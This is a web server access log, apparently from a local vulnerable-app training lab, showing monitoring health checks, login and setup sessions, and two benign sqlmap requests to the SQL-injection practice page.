172.18.0.4 - - [26/Apr/2025:09:11:07 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.6:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:12:03 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:12:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:12:18 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:12:18 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:12:33 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:12:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
192.168.178.133 - - [26/Apr/2025:09:12:36 +0000] "GET /login.php HTTP/1.1" 200 1191 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:12:44 +0000] "POST /login.php HTTP/1.1" 302 337 "http://192.168.178.152:8080/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:12:44 +0000] "GET /setup.php HTTP/1.1" 200 2050 "http://192.168.178.152:8080/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:12:46 +0000] "POST /setup.php HTTP/1.1" 302 337 "http://192.168.178.152:8080/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:12:46 +0000] "GET /setup.php HTTP/1.1" 200 2192 "http://192.168.178.152:8080/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:12:48 +0000] "GET /login.php HTTP/1.1" 200 1049 "http://192.168.178.152:8080/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
172.18.0.2 - - [26/Apr/2025:09:12:48 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:12:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
192.168.178.133 - - [26/Apr/2025:09:12:53 +0000] "POST /login.php HTTP/1.1" 302 336 "http://192.168.178.152:8080/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:12:53 +0000] "GET /index.php HTTP/1.1" 200 3036 "http://192.168.178.152:8080/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:12:55 +0000] "GET /security.php HTTP/1.1" 200 2456 "http://192.168.178.152:8080/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:12:58 +0000] "GET /vulnerabilities/sqli/ HTTP/1.1" 200 1771 "http://192.168.178.152:8080/security.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
172.18.0.2 - - [26/Apr/2025:09:13:03 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:13:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:13:18 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:13:18 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:13:33 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:13:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:13:48 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:13:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:14:03 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:14:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
192.168.178.133 - - [26/Apr/2025:09:14:11 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 200 1756 "http://192.168.178.152:8080/vulnerabilities/sqli/" "sqlmap/1.9.3#stable (https://sqlmap.org)"
172.18.0.2 - - [26/Apr/2025:09:14:18 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:14:18 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:14:33 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:14:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:14:48 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:14:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:15:03 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:15:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:15:18 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:15:18 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:15:33 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:15:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:15:48 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:15:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:16:03 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:16:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:16:18 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:16:18 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:16:33 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:16:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:16:48 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:16:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:17:03 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:17:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:17:18 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:17:18 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:17:33 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:17:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:17:48 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:17:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:18:03 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:18:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:18:18 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:18:18 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:18:33 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:18:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:18:48 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:18:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:19:03 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:19:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:19:18 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:19:18 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:19:33 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:19:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:19:48 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:19:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:20:03 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:20:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:20:18 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:20:18 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:20:33 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:20:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:20:48 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:20:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:21:03 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:21:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:21:18 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:21:18 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:21:34 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:21:34 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:21:48 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:22:03 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:22:18 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:22:18 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:22:33 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:22:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:22:48 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:22:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:23:03 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:23:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:23:18 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:23:18 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:23:33 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:23:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:23:48 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:23:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:24:03 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:24:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:24:18 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:24:18 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:24:33 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:24:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:24:48 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:24:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:25:03 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:25:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:25:18 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.2 - - [26/Apr/2025:09:25:18 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:26:22 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:26:22 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.3:80" "Blackbox Exporter/0.26.0"
192.168.178.1 - - [26/Apr/2025:09:26:33 +0000] "GET /login.php HTTP/1.1" 200 1050 "http://192.168.178.152:8080/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
172.18.0.6 - - [26/Apr/2025:09:26:37 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:26:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.3:80" "Blackbox Exporter/0.26.0"
192.168.178.133 - - [26/Apr/2025:09:26:44 +0000] "GET /vulnerabilities/sqli/ HTTP/1.1" 302 343 "http://192.168.178.152:8080/security.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:26:44 +0000] "GET /login.php HTTP/1.1" 200 1050 "http://192.168.178.152:8080/security.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:26:51 +0000] "POST /login.php HTTP/1.1" 302 337 "http://192.168.178.152:8080/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:26:51 +0000] "GET /setup.php HTTP/1.1" 200 2048 "http://192.168.178.152:8080/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
172.18.0.6 - - [26/Apr/2025:09:26:52 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:26:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.3:80" "Blackbox Exporter/0.26.0"
192.168.178.133 - - [26/Apr/2025:09:26:55 +0000] "POST /setup.php HTTP/1.1" 302 337 "http://192.168.178.152:8080/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:26:55 +0000] "GET /setup.php HTTP/1.1" 200 2187 "http://192.168.178.152:8080/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:26:58 +0000] "GET /login.php HTTP/1.1" 200 1049 "http://192.168.178.152:8080/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:27:03 +0000] "POST /login.php HTTP/1.1" 302 337 "http://192.168.178.152:8080/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:27:03 +0000] "GET /index.php HTTP/1.1" 200 3036 "http://192.168.178.152:8080/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:27:06 +0000] "GET /security.php HTTP/1.1" 200 2455 "http://192.168.178.152:8080/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
172.18.0.6 - - [26/Apr/2025:09:27:07 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:27:07 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.3:80" "Blackbox Exporter/0.26.0"
192.168.178.133 - - [26/Apr/2025:09:27:09 +0000] "GET /vulnerabilities/sqli/ HTTP/1.1" 200 1771 "http://192.168.178.152:8080/security.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
172.18.0.6 - - [26/Apr/2025:09:27:22 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:27:22 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.3:80" "Blackbox Exporter/0.26.0"
192.168.178.133 - - [26/Apr/2025:09:27:33 +0000] "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 200 1756 "http://192.168.178.152:8080/vulnerabilities/sqli/" "sqlmap/1.9.3#stable (https://sqlmap.org)"
172.18.0.6 - - [26/Apr/2025:09:27:37 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:27:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.3:80" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:27:52 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:27:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.3:80" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:28:07 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:28:07 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.3:80" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:28:22 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:28:22 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.3:80" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:28:37 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:28:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.3:80" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:28:52 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:28:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.3:80" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:29:07 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:29:07 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.3:80" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:29:22 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:29:22 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.3:80" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:29:37 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.6 - - [26/Apr/2025:09:29:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.3:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:42:28 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:42:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
192.168.178.133 - - [26/Apr/2025:09:42:37 +0000] "GET /vulnerabilities/sqli/ HTTP/1.1" 302 343 "http://192.168.178.152:8080/security.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:42:37 +0000] "GET /login.php HTTP/1.1" 200 1048 "http://192.168.178.152:8080/security.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
172.18.0.3 - - [26/Apr/2025:09:42:43 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:42:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
192.168.178.133 - - [26/Apr/2025:09:42:44 +0000] "POST /login.php HTTP/1.1" 302 337 "http://192.168.178.152:8080/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:42:44 +0000] "GET /setup.php HTTP/1.1" 200 2050 "http://192.168.178.152:8080/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:42:46 +0000] "POST /setup.php HTTP/1.1" 302 337 "http://192.168.178.152:8080/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:42:46 +0000] "GET /setup.php HTTP/1.1" 200 2189 "http://192.168.178.152:8080/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:42:48 +0000] "GET /login.php HTTP/1.1" 200 1049 "http://192.168.178.152:8080/setup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:42:52 +0000] "POST /login.php HTTP/1.1" 302 336 "http://192.168.178.152:8080/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
192.168.178.133 - - [26/Apr/2025:09:42:52 +0000] "GET /index.php HTTP/1.1" 200 3036 "http://192.168.178.152:8080/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
172.18.0.3 - - [26/Apr/2025:09:42:58 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [26/Apr/2025:09:42:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.4:80" "Blackbox Exporter/0.26.0"
